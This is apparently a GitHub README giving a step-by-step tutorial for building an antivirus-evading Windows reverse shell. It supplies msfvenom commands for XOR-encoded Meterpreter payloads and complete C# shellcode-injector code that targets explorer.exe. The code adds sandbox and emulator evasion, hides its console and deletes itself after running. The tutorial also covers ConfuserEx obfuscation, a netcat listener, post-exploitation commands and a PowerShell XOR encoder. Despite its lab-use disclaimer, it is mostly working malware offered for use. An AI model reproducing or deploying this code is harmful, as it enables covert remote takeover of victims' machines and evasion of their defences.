## Reverse Shell Creation & AV Evasion  

> ## ⚠️ Warning  
> **For authorized lab use only.**  
> Running these techniques on systems you do **not** own or without permission is illegal.  
> *This repository is provided “as is”, without warranty of any kind. The author assumes no liability for any misuse. By using any part of this code you agree to comply with all applicable laws and gain explicit permission before running it against a system.*

> [!Note]
> The C# injector Working Undetected From Windows Defender
>
> `Last Checked`: 19.Mai.2025
> 
> The C# injector Code is Public Here So i Expect it to be patched soon by someone posting this on virustotal and giving the string away so i recommend reconstructing the C# code to your own.

### Prerequisites
- **Visual Studio 2022** (with .NET Framework support)
- **ConfuserEx** (download [here](https://github.com/yck1509/ConfuserEx/releases/tag/v1.0.0))
- **Kali Linux** (for `msfvenom` payload generation)
- Basic knowledge of C# and command-line tools.

### `Generate XOR‑encrypted shell‑code/Payload`
   ```bash
   Choose which line you want to create the payload you can test all 3:
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=443 EXITFUNC=thread --encrypt xor --encrypt-key j
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key j
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=443 EXITFUNC=thread -f csharp
   ```
> <img src="https://github.com/user-attachments/assets/05c31f8d-447a-44f0-b215-cd39313ee679" width="900" />

### You Will Get something like this copy everything even the `Byte[]` text:
> <img src="https://github.com/user-attachments/assets/5b21cfac-bbed-4011-8ff0-ceeacdbd42ab" width="400" />



### `Open C# Visual studio 2022`
> <img src="https://github.com/user-attachments/assets/d08375a7-da87-4378-b697-b0ed2e0d0bf6" width="600" />

### `Choose Console App (.NET Framework)` And create Project
> <img src="https://github.com/user-attachments/assets/6172b649-4d36-4a4e-b622-f2d430b1ef4a" width="600" />

### Paste This injector Code & edit the `namespace inject` to ur own namespace name

```csharp
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace inject
{
    internal class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        static void Main(string[] args)
        {
            // Check if we're in a sandbox by calling a rare-emulated API
            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
            {
                return;
            }

            IntPtr ptrCheck = FlsAlloc(IntPtr.Zero);
            if (ptrCheck == null)
            {
                return;
            }

            // uncomment the following code if the sand box has internet

            //string exename = "Injector+heuristics";
            //if (Path.GetFileNameWithoutExtension(Environment.GetCommandLineArgs()[0]) != exename)
            //{
            //    return;
            //}

            //if (Environment.MachineName != "EC2AMAZ-CRPLELS")
            //{
            //    return;
            //}

            //try
            //{
            //    HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://bossjdjiwn.com/");
            //    HttpWebResponse res = (HttpWebResponse)req.GetResponse();
            //
            //   if (res.StatusCode == HttpStatusCode.OK)
            //   {
            //        return;
            //    }
            //}
            //catch (WebException we)
            //{
            //    Console.WriteLine("\r\nWebException Raised. The following error occured : {0}", we.Status);
            //}

            // Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
            var rand = new Random();
            uint dream = (uint)rand.Next(10000, 20000);
            double delta = dream / 1000 - 0.5;
            DateTime before = DateTime.Now;
            Sleep(dream);
            if (DateTime.Now.Subtract(before).TotalSeconds < delta)
            {
                Console.WriteLine("Joker, get the rifle out. We're being fucked.");
                return;
            }

            Process[] pList = Process.GetProcessesByName("explorer");
            if (pList.Length == 0)
            {
                // Console.WriteLine("[-] No such process!");
                System.Environment.Exit(1);
            }
            int processId = pList[0].Id;
            // 0x001F0FFF = PROCESS_ALL_ACCESS
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, processId);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);




            By zebbern SHELLCODE PAYLOAD HERE CHOOSE FROM ABOVE THIS TEXT PUT IT IN KALI PASTE THE SCRIPT




            // XOR-decrypt the shellcode
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'j');
            }

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            // Launch a separate process to delete the executable
            string currentExecutablePath = Process.GetCurrentProcess().MainModule.FileName;
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + currentExecutablePath + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });

        }
    }
}

```

### Now Copy The Code We Generated From `msfvenom` Above
#### Replace this code line in the c# script 
```
By zebbern SHELLCODE PAYLOAD HERE CHOOSE FROM ABOVE THIS TEXT PUT IT IN KALI PASTE THE SCRIPT
```
#### With the generated msfvenom payload
```
byte[] buf = new byte[460] {0x96,0x22 etc...............0xbf};
```
### Now It should look something like this:
> <img src="https://github.com/user-attachments/assets/e05bb4fb-8afd-4939-b343-4a8237e72887" width="600" />

### Now go to `Configuration Manager...` & Make it like in the pictures
> <img src="https://github.com/user-attachments/assets/ac48d688-1c70-420f-9e65-4819fe0d7a1d" width="400" />
> <img src="https://github.com/user-attachments/assets/e0877672-bd3b-409f-93b0-a164ef56b138" width="600" />

#### Hide the Console Window  
1. **Project → Properties → Application → Output Type → _Windows Application_**  
2. Re‑build (**Release | x64**).

### Now build the solution
> <img src="https://github.com/user-attachments/assets/3ed2f025-7b01-4436-ba70-659086f63420" width="600" />

### If you now see in console: `Build success` You have done correct
> <img src="https://github.com/user-attachments/assets/3a7d3a30-abea-4d81-92e3-2bf6ed489f53" width="600" />

#### Now Lets Obfuscate Using (ConfuserEx)
* Drag the fresh `.exe` into ConfuserEx  
* **Preset = Normal** → add ~10 random protections → **Protect**  
* The obfuscated binary appears in `/Confused/`.

> <img src="https://github.com/user-attachments/assets/eff08d19-8247-4bb8-a74d-772d3d12e4b5" width="600" />

### Go to settings Click the .exe listed and click +
> <img src="https://github.com/user-attachments/assets/568fc657-8f72-4223-8513-4393a8bd8f72" width="600" />

### Make it to Preset Normal and click +
`Add these in a random order it should be 10`
> <img src="https://github.com/user-attachments/assets/3cf413bf-11e2-4fde-b6ea-94c321807f9c" width="300" />

### Click `Done` Then Click `Protect`
> <img src="https://github.com/user-attachments/assets/d1a31619-389e-4ea1-8f3c-c42e185d8af9" width="600" />


## Run & Test
1. **Listener** (attacker):
   ```bash
   rlwrap -cAr nc -lvnp 443
   ```
2. **Target**: double‑click the obfuscated payload.  
3. **Success** → a shell or Meterpreter session connects back.

> **Tip:** use a high‑numbered port (e.g. 443, 8443) that the firewall allows.
> <img src="https://github.com/user-attachments/assets/c5b71f7e-f34f-4c52-a056-fb72cceaf702)


## Post‑exploitation Cheatsheet
```text
whoami
systeminfo
ipconfig /all
net users
net localgroup administrators
```

---

## Troubleshooting

| Issue | Fix |
|-------|-----|
| Payload deleted on save | Verify EXE is obfuscated **and** shell‑code is XOR‑encoded |
| No callback | Check IP/LPORT, outbound firewall, AV quarantine |
| Program exits instantly | Sandbox/timing checks triggered – comment them for lab use |
| ConfuserEx “resource not found” | Make sure you built **Release | x64** before obfuscation |

---

## Credits
* [Zebbern](https://github.com/zebbern)
* [ConfuserEx](https://github.com/yck1509/ConfuserEx)

---

## Appendix – One‑liner XOR Encoder (PowerShell)
```powershell
# Encode sc.bin with key 0x6A
[byte[]]$sc  = Get-Content sc.bin -Encoding Byte
$key = 0x6A
$enc = $sc | ForEach-Object { $_ -bxor $key }
[System.IO.File]::WriteAllBytes('sc_xor.bin', $enc)
```

Happy (legal) hacking! 🛡️
